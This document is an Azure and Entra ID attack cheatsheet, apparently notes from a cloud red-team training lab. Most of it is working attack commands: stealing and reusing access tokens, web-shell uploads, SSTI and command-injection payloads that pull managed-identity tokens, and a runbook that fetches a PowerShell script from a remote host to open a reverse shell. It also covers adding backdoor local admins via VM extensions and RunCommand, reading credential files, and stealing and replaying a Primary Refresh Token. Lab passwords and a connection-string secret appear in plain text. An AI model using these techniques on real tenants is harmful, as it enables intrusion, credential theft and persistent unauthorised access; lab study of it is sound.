

  
### Credential template
```
$password = ConvertTo-SecureString '<PASSWD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USER>', $password)
Connect-AzAccount -Credential $creds
```
- If you also want AzureAD (Users and Groups enum):
```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds
```
  
### Token template
```
$Token = 'eyJ0…'
$graphaccesstoken = 'eyJ0…'

Connect-AzAccount -AccessToken $Token -GraphAccessToken $graphaccesstoken -AccountId <TargetUserId>
```
### Service Principal
```
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
```
### Powershell Remoting template
```
$password = ConvertTo-SecureString '<PASSWD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USER>', $Password) 
$sess = New-PSSession -ComputerName <TargetIP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
Enter-PSSession $sess
```
### Powershell Remoting - 2nd Jump RCE (cant have session within session)
```
$password = ConvertTo-SecureString '<PASSWD>' -AsPlainText -Force 
$creds = New-Object System.Management.Automation.PSCredential('.\<user>', $Password)
$targethost = New-PSSession -ComputerName <TargetIP> -Credential $creds
Invoke-Command -Session $targethost -ScriptBlock{hostname}
Invoke-Command -Session $targethost -ScriptBlock{dsregcmd /status}
```
* * * 
### New Identity - Enumerate whenever we get access to a new user or workload identity - AzResources, then enumerate the resources we have access to by choosing from the below ToC...
```
(Get-AzContext).Account
Get-AzResource
Get-AzResourceGroup

Get-AzRoleAssignment
Get-AzRoleAssignment | select DisplayName, RoleDefinitionName, ObjectType, CanDelegate
Get-AzRoleAssignment -Scope //
//MAY NEED TO USE MANUAL API CALL IF THIS DOESNT WORK

Get-AzRoleDefinition -Name "<Virtual Machine Command Executor>"

Get-AzADGroup -DisplayName '<VM Admins>' 
Get-AzADGroupMember -GroupDisplayName '<VM Admins>' | select DisplayName

Get-AzAdApplication
```

```
Get-AzVM
Get-AzWebApp
Get-AzFunctionApp
Get-AzStorageAccount | fl
Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName defcorpcodebackup)
Get-AzKeyVault
```

* * *
- [AzureAD](https://github.com/conma293/Azure/blob/main/cheatsheet.md#azad)
  - [Users and groups](https://github.com/conma293/Azure/blob/main/cheatsheet.md#users-and-groups)
  - [Administrative Unit](https://github.com/conma293/Azure/blob/main/cheatsheet.md#administrative-unit)
  - [Service Principal - Will ALWAYS have the same (display)name as the Application](https://github.com/conma293/Azure/blob/main/cheatsheet.md#service-principal)
  - [Application Proxy]
  - [Preview Module for custom role and policy](https://github.com/conma293/Azure/blob/main/cheatsheet.md#preview-module-for-custom-roles)
- [AZ Powershell](https://github.com/conma293/Azure/blob/main/cheatsheet.md#azure-powershell)
  - [whoami](https://github.com/conma293/Azure/blob/main/cheatsheet.md#whoami)
  - [Resources](https://github.com/conma293/Azure/blob/main/cheatsheet.md#resources)
  - [ResourceGroups]()
  - [VMS, VMExtension, Apps](https://github.com/conma293/Azure/blob/main/cheatsheet.md#vms-apps)
  - [Storage](https://github.com/conma293/Azure/blob/main/cheatsheet.md#storage)
  - [Keyvaults](https://github.com/conma293/Azure/blob/main/cheatsheet.md#keyvault)
  - [Role Assignments](https://github.com/conma293/Azure/blob/main/cheatsheet.md#role-assignments)
  - [Runbooks and Hybrid Worker Groups](https://github.com/conma293/Azure/blob/main/cheatsheet.md#hybrid-worker-groups)
  - [AzContext(similar to logonID sessions)](https://github.com/conma293/Azure/blob/main/cheatsheet.md#azcontext)
- Az CLI
  - [Current user and objects](https://github.com/conma293/Azure/blob/main/cheatsheet.md#current-users-and-objects)
  - [Automation account](https://github.com/conma293/Azure/blob/main/cheatsheet.md#automation-account)
  - AppConfigKey
- [Tokens Az Powershell](https://github.com/conma293/Azure/blob/main/cheatsheet.md#token-reuse)
  - [Pivot with tokens (Az CLI to Az Powershell)](https://github.com/conma293/Azure/blob/main/cheatsheet.md#pivot-from-shell-stealing-tokens)
- Manual APIs and common URLS
  - [API Call Template](https://github.com/conma293/Azure/blob/main/cheatsheet.md#api-call)
  - [URLs](https://github.com/conma293/Azure/blob/main/cheatsheet.md#uris)
  - [Example API Enumeration](https://github.com/conma293/Azure/blob/main/cheatsheet.md#example-api-enumeration)
- [Scripts](https://github.com/conma293/Azure/blob/main/cheatsheet.md#scripts)
  - Microburst
    - [subdomains](https://github.com/conma293/Azure/blob/main/cheatsheet.md#subdomains)
    - [storage blobs](https://github.com/conma293/Azure/blob/main/cheatsheet.md#storage-blobs)
    - [Application Proxy - Users who can access](https://github.com/conma293/Azure/blob/main/cheatsheet.md#users-able-to-access-appproxy)
  - [AzADAppSecret - add user to application we can access](https://github.com/conma293/Azure/blob/main/cheatsheet.md#azadappsecret)
- Web Application Exploitation
    - [Insecure WebApp FILE UPLOAD](https://github.com/conma293/Azure/blob/main/cheatsheet.md#web-application-file-upload)
    - [Server-Side Template Injection](https://github.com/conma293/Azure/blob/main/cheatsheet.md#server-side-template-injection)
    - [Command Injection](https://github.com/conma293/Azure/blob/main/cheatsheet.md#command-injection) 
- Runbooks & RunCommand
  - [Create Runbook](https://github.com/conma293/Azure/blob/main/cheatsheet.md#create-runbooks)
  - [RunCommand](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runcommand)
  - [Connect to VM](https://github.com/conma293/Azure/blob/main/cheatsheet.md#connect-to-vm)
    - [Get Public IP](https://github.com/conma293/Azure/blob/main/cheatsheet.md#get-public-ip)
- Interesting File Locations - localhost enumeration
  - [Powershell History](https://github.com/conma293/Azure/blob/main/cheatsheet.md#powershell-history---credentials)
  - [Powershell Transcript](https://github.com/conma293/Azure/blob/main/cheatsheet.md#powershell-transcript)
  - [AzureRMContext.json](https://github.com/conma293/Azure/blob/main/cheatsheet.md#azurermcontextjson---credentials-inc-client-secret-for-managed-identity)
  - IMDS
    - [VM User Data](https://github.com/conma293/Azure/blob/main/cheatsheet.md#vm-userdata)    
- Steal Primary Refresh Token (PRT)
   - [Get nonce](https://github.com/conma293/Azure/blob/main/cheatsheet.md#get-nonce)
   - [Get PRT]
 
  
**REFS:**
- [KillChain](https://github.com/conma293/Azure/blob/main/killcycle.md)
- [Enum](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md)
- [Tokens](https://github.com/conma293/Azure/blob/main/1.35_Tokens.md)

  
# Tools
### AzAD
```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
```

```
$passwd= ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds= New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
```
#### Users and Groups
```
Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com

Get-AzureADGroup -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 | fl *
Get-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7

Get-AzureADUser -SearchString 'admin'
Get-AzureADUser -SearchString 'admin' | Get-AzureADUserMembership

Get-AzureADUserMembership -ObjectId admin@defcorphq.onmicrosoft.com
Get-AzureADUserMembership -ObjectId admin@defcorphq.onmicrosoft.com | select displayname, mail, objecttype

Get-AzureADGroupMember -ObjectId 9240b75e-823c-4c02-8868-a00ddbeb3fa1
Get-AzureADGroupMember -ObjectId 8f7e7d00-12b6-45db-9b84-e221ccab7456
Get-AzureADGroupMember -ObjectId 8f7e7d00-12b6-45db-9b84-e221ccab7456 | select displayname, mail, objecttype

Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```
#### Administrative Unit
(Organisational Unit OU equiv for cloud)

_we can get the ID of the administrative unit via API call for ```/users/userx/memberOf``` of a member user/group_
```
Get-AzureADMSAdministrativeUnit -Id e1e26d93-163e-42a2-a46e-1b7d52626395
Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
```

Check specific roles and users within the administrative unit (grab the ```RoleId``` and ```RoleMemberInfo Id:``` (which is the User ObjectId)):
```
Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
Get-AzureADUser -ObjectId 8c088359-66fb-4253-ad0d-a91b82fd548a | fl *
```
#### Service Principal
```
Get-AzureADServicePrincipal
Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "62e44426-5c46-4e3c-8a89-f461d5d586f2"} | fl
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
```

#### Application Proxy
*Find Service Principal owner with same name - then run [script](https://github.com/conma293/Azure/blob/main/cheatsheet.md#users-able-to-access-appproxy) to get users
```
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
```

#### Preview Module for custom roles
```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
$passwd= ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds= New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
```

```
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```

### MG
```
```
## Azure Powershell
```
Install-Module Az 
```

```
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
```
OR Token:-
```
$Token = 'eyJ0…'
Connect-AzAccount -AccessToken $Token -AccountId <"client_id">
```
#### whoami
```
(Get-AzContext).Account
```

#### Resources:
```
Get-AzResource
Get-AzAdUser
Get-AzAdApplication
```

#### Resource Group
```
Get-AzResourceGroupDeployment -ResourceGroupName SAP
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv
```

#### VMs, Apps
*For Apps find Service Principal owner with same name
```
Get-AzVM | fl *

Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"

Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student213 StudxPassword@123 /add /Y; net localgroup administrators student213 /add"}'

Get-AzWebApp
Get-AzWebApp | select name, HostNames, kind, state, identity

Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
Get-AzFunctionApp
```

####  Storage
**Remember to use _Azure Storage Explorer GUI_ to download storage containers/blobs!**
- Right click storage account > connect to azure storage > subscription (if you have user) or storage account/blob

```
Get-AzStorageAccount | fl
Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName defcorpcodebackup)
```

#### Keyvault
```
Get-AzKeyVault

Get-AzKeyVaultSecret -VaultName <ResearchKeyVault>
Get-AzKeyVaultSecret -VaultName <ResearchKeyVault> -Name <Reader>
Get-AzKeyVaultSecret -VaultName <ResearchKeyVault> -Name <Reader> -AsPlainText
```


#### Role Assignments
```
Get-AzRoleAssignment
Get-AzRoleAssignment | select DisplayName, RoleDefinitionName, ObjectType, CanDelegate
```

Pivot on all scope:
```
Get-AzRoleAssignment -Scope </sub/resources/etc>
Get-AzRoleAssignment -Scope </sub/resources/etc> | select RoleDefinitionName, ObjectId, ObjectType
```

Look at specific role:
```
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
```

#### Hybrid Worker Groups
```
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
```

#### AzContext

If you compromise a machine worth checking out azcontext, similar to sessions, if we steal an azcontext with ```select-azcontext``` we may be able to grab all the permissions(_i.e., Role Assignments_) of that context/session. Good to check, similar to rubeus checking cached tickets from LogonID sessions.
```
get-azcontext
select-azcontext -Name <copy pasted>
```

* * * 

## Az CLI 
```
--query "[].{roleDefinitionName, principalName, scope}" -o table
--query "[].{name: displayName, type: objectType, id: objectId}" --output table
```
#### Current users and objects
```
az ad signed-in-user show

az ad signed-in-user list-owned-objects
az ad signed-in-user list-owned-objects --query "[].{name: displayName, type: objectType, id: objectId}" --output table
```
#### Automation Account
```
az extension add --upgrade -n automation
az automation account list
```
To be able to interact with Azure AD:
- request a token for the ms-graph: ```az account get-access-token --resource-type ms-graph```
- or request a token for the aad-graph: ```az account get-access-token --resource-type aad-graph```
- And request a token for resources (ARM): ```az account get-access-token```
- And then connect: ```Connect-AzAccount -AccessToken $Token -GraphAccessToken $graphaccesstoken -AccountId <VictimObjectId>```

#### App Config Key
```
az appconfig kv list --connection-string "Endpoint=https://escrow3.azconfig.io;Id=q63q-lab-s0:IkiICUfj7aoiWdfW+fLf;Secret=j50xk3bTCW3uZ4R+jMAyu/feCaKRXrAucE5dJs5OHmY="
```

* * *

## Token reuse

#### Azure Powershell:
```
Connect-AzAccount -AccessToken $Token -AccountId test@defcorphq.onmicrosoft.com

Get-AzAccessToken -ResourceTypeName MSGraph
Disconnect-AzAccount
Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken $Token -MicrosoftGraphAccessToken eyJ0eXA...
```

#### Pivot from shell stealing tokens
- On victim shell using Az CLI:
```
az account get-access-token
az account get-access-token --resource-type aad-graph
```

- Open a new Powershell console and use Az Powershell:
```
PS C:\AzAD\Tools> $Token = 'eyJ0…'
PS C:\AzAD\Tools> $graphaccesstoken = 'eyJ0…'
```
Now you can connect; ```-AccountID``` is victimID you stole the tokens from:
```
Connect-AzAccount -AccessToken $Token -GraphAccessToken $graphaccesstoken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
```

* * *

# API Call
```
$Token=''
OR
$Token=(Get-AzAccessToken).Token
OR
$Token=(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
```
**MAKE SURE YOU HAVE TOKEN!** - ```$Token = (Get-AzAccessToken).Token```
```
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

#### URIs
https://learn.microsoft.com/en-us/graph/api/serviceprincipal-get?view=graph-rest-1.0&tabs=http


ARM:
- vms
- webapp
- storage blob
- keyvault
  
**MAKE SURE YOU HAVE TOKEN!** - ```$Token = (Get-AzAccessToken).Token```
```
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$URI = 'https://management.azure.com/subscriptions/<SubID>/resources?api-version=2020-10-01'

$URI = 'https://management.azure.com/subscriptions/<SubID>/<resource>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

EXAMPLE:
$URI = 'https://management.azure.com/subscriptions/<SubID>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

```

And Graph:
- Groups
- Roles
- Devices
- Applications
- App Registrations
- Service Principals


```
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $graphaccesstoken"
}
}
(Invoke-RestMethod @RequestParams).value
```

**MAKE SURE YOU HAVE TOKEN!** - ```$graphaccesstoken=(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token```

```
$URI = 'https://graph.microsoft.com/v1.0/users'
$URI = 'https://graph.microsoft.com/v1.0/groups'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$URI = 'https://graph.microsoft.com/v1.0/servicePrincipals'
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributor213@defcorphq.onmicrosoft.com/memberOf'
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributor213@defcorphq.onmicrosoft.com/appRoleAssignments'
```
If we can access applications then use [azadappsecret](https://github.com/conma293/Azure/blob/main/cheatsheet.md#azadappsecret) to determine privilege (and add users) 

## Example API Enumeration:
```Get-AzResource```:
```
Name              : infradminsrv/MicrosoftMonitoringAgent
ResourceGroupName : Research
ResourceType      : Microsoft.Compute/virtualMachines/extensions
Location          : germanywestcentral
ResourceId*        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/extensions/MicrosoftMonitoringAgent
Tags              :
```
- Use the following portion of the returned ResourceId for the URI Scope:
- **/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv**
- You could also try ```.../virtualMachines/``` without specifying the specific VM to see if you can read ALL VMs... but if not, specify the specific resource you are returned from ```Get-AzResource```:
```
$URI = 'https://management.azure.com/
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/
/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
```
* * *

## Scripts
#### Subdomains:
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
```


#### Storage Blobs:

- We can also add permutations like common, backup, code to ```permutations.txt``` in ```C:\AzAD\Tools\Microburst\Misc``` to tune it for the specific domain we are targetting\
- If the browser doesnt allow you access to the referenced blob try using Azure Storage Explorer GUI!
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1 
Invoke-EnumerateAzureBlobs -Base defcorp
```

#### Users able to access AppProxy
```
. C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1 
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362
```
## AzADAppSecret 
_Add user to Application we can access (probably as a managed identity)_
```
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphaccesstoken -Verbose
```
* * * 

# Web Application File Upload

Files:
- studentxshell.phtml
- studentxtoken.phtml
- RevShell_phtml.phtml

Example upload:
```
https://defcorphqcareer.azurewebsites.net/
https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
```

append:
```
/uploads/studentxshell.phtml?cmd=env
```

For tokens browse to:
```
/uploads/studentxtoken.phtml
```

Now we can reuse that token to launch a session:

```"client_id":``` ==  ```-AccountId```

```
Connect-AzAccount -AccessToken $Token -AccountId <client_id>
```
## Server-Side Template Injection
OR FOR SSTI:


```{{config.items()}}```
We know this app is running flask (from }config.items()} injection)

Therefore we can just use the popen call from the os module:
```
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
```

ENV will give us the ```Identity Header``` which is the ClientID and the ```Identity Endpoint``` - copy these down to notepad!!

Now Let's request the access token for the managed identity now using the following code:
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```
- IF THERE IS A **KEYVAULT** RESOURCE:
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

Now we can reuse the token:

```
Connect-AzAccount -AccessToken $Token -AccountId <IDENTITY_HEADER>
```

- And if there is also a _keyvault_ logon with that key also to be able to read the secrets:
```
PS C:\AzAD\Tools> $Token = 'eyJ0..'
PS C:\AzAD\Tools> $keyvaulttoken = 'eyJ0..'
```

```
Connect-AzAccount -AccessToken $Token -AccountId <IDENTITY_HEADER> -KeyVaultAccessToken $keyvaulttoken
```
## Command Injection
a lot of the time the EndOfLine or Special Character is a ```;``` - so just put a semi-colon and a system call after it to test!

This website says when we upload files it goes to the ```/tmp``` folder for scanning.. we can upload a python script (within a zip) to extract the tokens and run it from the vulnerable form:
```
; ls /tmp;
; ls /tmp/uploads/studentx;
; python /tmp/uploads/studentx/studentx.py;
```

* * * 

# Playbooks

## Create Runbooks

#### Prepare code for runbook
Create script to be executed via runbook, remember to host TCPConnect.ps1:
```
iex (New-Object Net.Webclient).downloadstring("http://172.16.152.213:82/Invoke-PowerShellTcp.ps1")
Power -Reverse -IPAddress 172.16.152.213 -Port 1234
```

#### Create and Execute runbook
```
Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
```
```
Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```
```
Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

## RunCommand

#### Run a script 
Create a script to be used in the runcommand, below is a powershell script to add a user to local administrators group:
```
$passwd = ConvertTo-SecureString "Stud213Password@123" -AsPlainText -Force
New-LocalUser -Name student213 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student213
```
#### RunCommand
Now we can run the script via VMRumCommand:
```
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
```

* * *


## Connect to VM
#### Get Public IP
```
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile

Get-AzNetworkInterface -Name bkpadconnect368

Get-AzPublicIpAddress -Name bkpadconnectIP
```

#### Connect to VM
Now we are a user on the VM and we know the publically addressable IP, we can connect directly to it using PS Remoting
```
$password = ConvertTo-SecureString 'Stud213Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student213', $Password) 
$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
Enter-PSSession $sess
```


## Interesting File Locations

#### Powershell history - credentials
```
Get-LocalUser
cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Powershell Transcript
```
cat C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
```

#### AzureRmContext.json - credentials inc Client Secret for Managed Identity
```
cat C:\Users\studentuserx\.Azure\AzureRmContext.json
```


### IMDS
#### VM UserData:
```
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

### Hybrid
Is is joined to AzureAD?
```
Invoke-Command -Session $infradminsrv -ScriptBlock{dsregcmd /status}
```

* * * 

## Steal Primary Refresh Token
#### Get nonce
```
$TenantId = "<TenantId>"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
$Params = @{
		"URI" = $URL
		"Method" = "POST"
}
$Body = @{
		"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```
#### Steal PRT

[Stage](https://github.com/conma293/Azure/blob/main/killcycle.md#session-play) the binaries ```PsExec64.exe``` ```SessionExecCommand.exe``` and ```ROADToken.exe``` on the machine with the user PRT
```
Copy-Item -ToSession $TargetVM -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\ProgramData\ –Verbose 
```

Enter session- ```Enter-PSSession -Session $TargetVM```

Run scripts as user who possesses the PRT: 
```
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\ProgramData\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\ProgramData\SessionExecCommand.exe MichaelMBarron C:\ProgramData\ROADToken.exe <nonce> > C:\ProgramData\PRT.txt"}
```

Show PRT:
```
Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\ProgramData\PRT.txt}
```
#### Pass PRT
- goto ```https://login.microsoftonline.com/login.srf``` in incognito browser
- clear all cookies - Press F12 (Chrome dev tools) -> Application -> Cookies (may try clearing several times)
	- Add x-ms-RefreshTokenCredential and set value from stolen PRT
	- Mark HTTPOnly and Secure for the cookie
	- Visit https://login.microsoftonline.com/login.srf again
- As the redirect to office.com is spinning and not loading, open up a few new tabs and navigate, it should grab the cookie:
	- https://endpoint.microsoft.com/#home
	- portal.azure.com


















